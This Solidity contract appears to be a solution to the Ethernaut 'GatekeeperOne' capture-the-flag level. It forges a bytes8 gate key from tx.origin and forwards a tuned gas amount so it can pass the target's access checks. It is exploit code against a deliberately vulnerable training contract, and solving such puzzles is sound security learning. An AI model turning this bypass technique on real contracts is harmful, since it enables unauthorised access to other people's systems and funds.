// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOne {
    IGatekeeperOne gatekeeperOneInstance;

    constructor(address _instanceAddress) {
        gatekeeperOneInstance = IGatekeeperOne(_instanceAddress);
    }

    function enter(uint256 gasToUse) external {
        bytes8 key = bytes8(abi.encodePacked(uint32(1), uint16(0), uint16(uint160(tx.origin)), uint192(0)));
        bool success = gatekeeperOneInstance.enter{gas: gasToUse}(key); //106739
        require(success, "Failed to enter");
    }
}
